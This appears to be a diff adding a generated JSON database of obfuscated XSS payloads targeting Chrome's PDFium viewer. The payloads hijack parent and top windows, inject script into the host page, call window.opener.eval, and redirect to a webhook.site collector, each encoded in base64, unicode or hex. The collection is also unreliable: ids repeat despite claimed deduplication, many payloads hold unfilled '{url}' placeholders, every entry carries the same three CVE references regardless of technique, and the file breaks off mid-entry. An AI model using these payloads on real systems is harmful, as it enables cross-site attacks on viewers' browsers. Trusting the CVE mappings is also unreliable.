@@ -1,0 +1,400 @@
+{
+  "metadata": {
+    "generated_at": "20250727_122050",
+    "total_payloads": 37,
+    "source_files": [
+      "merged_payload_database_20250727_110154.json",
+      "sophisticated_payload_database_20250727_061729.json",
+      "sophisticated_payload_database_20250727_072313.json",
+      "sophisticated_payload_database_20250727_055841.json",
+      "sophisticated_payload_database_20250727_095656.json"
+    ],
+    "original_total": 74,
+    "duplicates_removed": 37,
+    "generator_version": "2.0",
+    "merge_tool": "merge_json_payloads.py",
+    "breakdown": {
+      "browsers": {
+        "chrome": 37
+      },
+      "categories": {
+        "dom_access": 37
+      },
+      "risk_levels": {
+        "high": 37
+      }
+    }
+  },
+  "payloads": [
+    {
+      "id": "xss_pdf_0001",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwczovL3dlYmhvb2suc2l0ZS90ZXN0JzsgfSBjYXRjaChlKSB7IGFwcC5hbGVydCgnQ2hyb21lIGJsb2NrZWQ6ICcgKyBlKTsgfQ=='); (new Function(decoded))(); } catch(e) { try { parent.window.location = 'https://webhook.site/test'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0002",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0077\\u0065\\u0062\\u0068\\u006f\\u006f\\u006b\\u002e\\u0073\\u0069\\u0074\\u0065\\u002f\\u0074\\u0065\\u0073\\u0074\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u0061\\u0070\\u0070\\u002e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0065\\u0064\\u003a\\u0020\\u0027\\u0020\\u002b\\u0020\\u0065\\u0029\\u003b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0003",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x2e\\x77\\x69\\x6e\\x64\\x6f\\x77\\x2e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x20\\x3d\\x20\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x77\\x65\\x62\\x68\\x6f\\x6f\\x6b\\x2e\\x73\\x69\\x74\\x65\\x2f\\x74\\x65\\x73\\x74\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x61\\x70\\x70\\x2e\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x62\\x6c\\x6f\\x63\\x6b\\x65\\x64\\x3a\\x20\\x27\\x20\\x2b\\x20\\x65\\x29\\x3b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0004",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgdG9wLmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gJzxoMT5DaHJvbWUgUERGaXVtIERPTSBYU1M8L2gxPjxzY3JpcHQ+bG9jYXRpb249Imh0dHBzOi8vd2ViaG9vay5zaXRlL3Rlc3QiPC9zY3JpcHQ+JzsgfSBjYXRjaChlKSB7IH0='); (new Function(decoded))(); } catch(e) { try { top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"https://webhook.site/test\"</script>'; } catch(e) { } } })();",
+      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0005",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0074\\u006f\\u0070\\u002e\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\\u002e\\u0062\\u006f\\u0064\\u0079\\u002e\\u0069\\u006e\\u006e\\u0065\\u0072\\u0048\\u0054\\u004d\\u004c\\u0020\\u003d\\u0020\\u0027\\u003c\\u0068\\u0031\\u003e\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0050\\u0044\\u0046\\u0069\\u0075\\u006d\\u0020\\u0044\\u004f\\u004d\\u0020\\u0058\\u0053\\u0053\\u003c\\u002f\\u0068\\u0031\\u003e\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u003d\\u0022\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0077\\u0065\\u0062\\u0068\\u006f\\u006f\\u006b\\u002e\\u0073\\u0069\\u0074\\u0065\\u002f\\u0074\\u0065\\u0073\\u0074\\u0022\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0006",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x74\\x6f\\x70\\x2e\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x62\\x6f\\x64\\x79\\x2e\\x69\\x6e\\x6e\\x65\\x72\\x48\\x54\\x4d\\x4c\\x20\\x3d\\x20\\x27\\x3c\\x68\\x31\\x3e\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x50\\x44\\x46\\x69\\x75\\x6d\\x20\\x44\\x4f\\x4d\\x20\\x58\\x53\\x53\\x3c\\x2f\\x68\\x31\\x3e\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x77\\x65\\x62\\x68\\x6f\\x6f\\x6b\\x2e\\x73\\x69\\x74\\x65\\x2f\\x74\\x65\\x73\\x74\\x22\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0007",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_3_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgd2luZG93Lm9wZW5lci5ldmFsKCdhbGVydCgiQ2hyb21lIFhTUyB2aWEgb3BlbmVyIik7IGxvY2F0aW9uPSJodHRwczovL3dlYmhvb2suc2l0ZS90ZXN0IicpOyB9IGNhdGNoKGUpIHsgfQ=='); (new Function(decoded))(); } catch(e) { try { window.opener.eval('alert(\"Chrome XSS via opener\"); location=\"https://webhook.site/test\"'); } catch(e) { } } })();",
+      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0008",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_3_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u006f\\u0070\\u0065\\u006e\\u0065\\u0072\\u002e\\u0065\\u0076\\u0061\\u006c\\u0028\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0058\\u0053\\u0053\\u0020\\u0076\\u0069\\u0061\\u0020\\u006f\\u0070\\u0065\\u006e\\u0065\\u0072\\u0022\\u0029\\u003b\\u0020\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u003d\\u0022\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0077\\u0065\\u0062\\u0068\\u006f\\u006f\\u006b\\u002e\\u0073\\u0069\\u0074\\u0065\\u002f\\u0074\\u0065\\u0073\\u0074\\u0022\\u0027\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0009",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_3_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x77\\x69\\x6e\\x64\\x6f\\x77\\x2e\\x6f\\x70\\x65\\x6e\\x65\\x72\\x2e\\x65\\x76\\x61\\x6c\\x28\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x58\\x53\\x53\\x20\\x76\\x69\\x61\\x20\\x6f\\x70\\x65\\x6e\\x65\\x72\\x22\\x29\\x3b\\x20\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x77\\x65\\x62\\x68\\x6f\\x6f\\x6b\\x2e\\x73\\x69\\x74\\x65\\x2f\\x74\\x65\\x73\\x74\\x22\\x27\\x29\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0010",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_4_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgZnJhbWVzWzBdLmxvY2F0aW9uID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlL3Rlc3QnOyB9IGNhdGNoKGUpIHsgYXBwLmxhdW5jaFVSTCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvdGVzdCcpOyB9'); (new Function(decoded))(); } catch(e) { try { frames[0].location = 'https://webhook.site/test'; } catch(e) { app.launchURL('https://webhook.site/test'); } } })();",
+      "description": "Chrome PDFium DOM access via try { frames[0].location = '{u... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0001",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwOi8vdGVzdC5jb20nOyB9IGNhdGNoKGUpIHsgYXBwLmFsZXJ0KCdDaHJvbWUgYmxvY2tlZDogJyArIGUpOyB9'); (new Function(decoded))(); } catch(e) { try { parent.window.location = 'http://test.com'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0002",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0063\\u006f\\u006d\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u0061\\u0070\\u0070\\u002e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0065\\u0064\\u003a\\u0020\\u0027\\u0020\\u002b\\u0020\\u0065\\u0029\\u003b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0001",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_1",
+      "payload": "eval(atob('dHJ5IHsgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICd7dXJsfSc7IH0gY2F0Y2goZSkgeyBhcHAuYWxlcnQoJ0Nocm9tZSBibG9ja2VkOiAnICsgZSk7IH0='))",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0002",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027\\u007b\\u0075\\u0072\\u006c\\u007d\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u0061\\u0070\\u0070\\u002e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0065\\u0064\\u003a\\u0020\\u0027\\u0020\\u002b\\u0020\\u0065\\u0029\\u003b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0003",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x2e\\x77\\x69\\x6e\\x64\\x6f\\x77\\x2e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x20\\x3d\\x20\\x27\\x7b\\x75\\x72\\x6c\\x7d\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x61\\x70\\x70\\x2e\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x62\\x6c\\x6f\\x63\\x6b\\x65\\x64\\x3a\\x20\\x27\\x20\\x2b\\x20\\x65\\x29\\x3b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0004",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_1",
+      "payload": "eval(atob('dHJ5IHsgdG9wLmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gJzxoMT5DaHJvbWUgUERGaXVtIERPTSBYU1M8L2gxPjxzY3JpcHQ+bG9jYXRpb249Int1cmx9Ijwvc2NyaXB0Pic7IH0gY2F0Y2goZSkgeyB9'))",
+      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0005",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0074\\u006f\\u0070\\u002e\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\\u002e\\u0062\\u006f\\u0064\\u0079\\u002e\\u0069\\u006e\\u006e\\u0065\\u0072\\u0048\\u0054\\u004d\\u004c\\u0020\\u003d\\u0020\\u0027\\u003c\\u0068\\u0031\\u003e\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0050\\u0044\\u0046\\u0069\\u0075\\u006d\\u0020\\u0044\\u004f\\u004d\\u0020\\u0058\\u0053\\u0053\\u003c\\u002f\\u0068\\u0031\\u003e\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u003d\\u0022\\u007b\\u0075\\u0072\\u006c\\u007d\\u0022\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0006",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x74\\x6f\\x70\\x2e\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x62\\x6f\\x64\\x79\\x2e\\x69\\x6e\\x6e\\x65\\x72\\x48\\x54\\x4d\\x4c\\x20\\x3d\\x20\\x27\\x3c\\x68\\x31\\x3e\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x50\\x44\\x46\\x69\\x75\\x6d\\x20\\x44\\x4f\\x4d\\x20\\x58\\x53\\x53\\x3c\\x2f\\x68\\x31\\x3e\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x7b\\x75\\x72\\x6c\\x7d\\x22\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0007",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_3_1",
+      "payload": "eval(atob('dHJ5IHsgd2luZG93Lm9wZW5lci5ldmFsKCdhbGVydCgiQ2hyb21lIFhTUyB2aWEgb3BlbmVyIik7IGxvY2F0aW9uPSJ7dXJsfSInKTsgfSBjYXRjaChlKSB7IH0='))",
+      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0008",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_3_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u006f\\u0070\\u0065\\u006e\\u0065\\u0072\\u002e\\u0065\\u0076\\u0061\\u006c\\u0028\\u0027\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0058\\u0053\\u0053\\u0020\\u0076\\u0069\\u0061\\u0020\\u006f\\u0070\\u0065\\u006e\\u0065\\u0072\\u0022\\u0029\\u003b\\u0020\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u003d\\u0022\\u007b\\u0075\\u0072\\u006c\\u007d\\u0022\\u0027\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0009",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_3_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x77\\x69\\x6e\\x64\\x6f\\x77\\x2e\\x6f\\x70\\x65\\x6e\\x65\\x72\\x2e\\x65\\x76\\x61\\x6c\\x28\\x27\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x58\\x53\\x53\\x20\\x76\\x69\\x61\\x20\\x6f\\x70\\x65\\x6e\\x65\\x72\\x22\\x29\\x3b\\x20\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x7b\\x75\\x72\\x6c\\x7d\\x22\\x27\\x29\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0010",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_4_1",
+      "payload": "eval(atob('dHJ5IHsgZnJhbWVzWzBdLmxvY2F0aW9uID0gJ3t1cmx9JzsgfSBjYXRjaChlKSB7IGFwcC5sYXVuY2hVUkwoJ3t1cmx9Jyk7IH0='))",
+      "description": "Chrome PDFium DOM access via try { frames[0].location = '{u... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0011",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_4_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0066\\u0072\\u0061\\u006d\\u0065\\u0073\\u005b\\u0030\\u005d\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027\\u007b\\u0075\\u0072\\u006c\\u007d\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u0061\\u0070\\u0070\\u002e\\u006c\\u0061\\u0075\\u006e\\u0063\\u0068\\u0055\\u0052\\u004c\\u0028\\u0027\\u007b\\u0075\\u0072\\u006c\\u007d\\u0027\\u0029\\u003b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { frames[0].location = '{u... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0012",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_4_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x66\\x72\\x61\\x6d\\x65\\x73\\x5b\\x30\\x5d\\x2e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x20\\x3d\\x20\\x27\\x7b\\x75\\x72\\x6c\\x7d\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x61\\x70\\x70\\x2e\\x6c\\x61\\x75\\x6e\\x63\\x68\\x55\\x52\\x4c\\x28\\x27\\x7b\\x75\\x72\\x6c\\x7d\\x27\\x29\\x3b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { frames[0].location = '{u... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0013",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_5_1",
+      "payload": "eval(atob('dHJ5IHsgcGFyZW50LmZyYW1lc1snbWFpbiddLmxvY2F0aW9uID0gJ3t1cmx9JzsgfSBjYXRjaChlKSB7IH0='))",
+      "description": "Chrome PDFium DOM access via try { parent.frames['main'].lo... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0014",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_5_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0066\\u0072\\u0061\\u006d\\u0065\\u0073\\u005b\\u0027\\u006d\\u0061\\u0069\\u006e\\u0027\\u005d\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027\\u007b\\u0075\\u0072\\u006c\\u007d\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { parent.frames['main'].lo... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0015",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_5_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x2e\\x66\\x72\\x61\\x6d\\x65\\x73\\x5b\\x27\\x6d\\x61\\x69\\x6e\\x27\\x5d\\x2e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x20\\x3d\\x20\\x27\\x7b\\x75\\x72\\x6c\\x7d\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { parent.frames['main'].lo... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0016",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_6_1",
+      "payload": "eval(atob('dHJ5IHsgcGFyZW50LnBvc3RNZXNzYWdlKHt7dHlwZToneHNzJyxwYXlsb2FkOidjaHJvbWVfcGRmJyx1cmw6J3t1cmx9J319LCAnKicpOyB9IGNhdGNoKGUpIHsgfQ=='))",
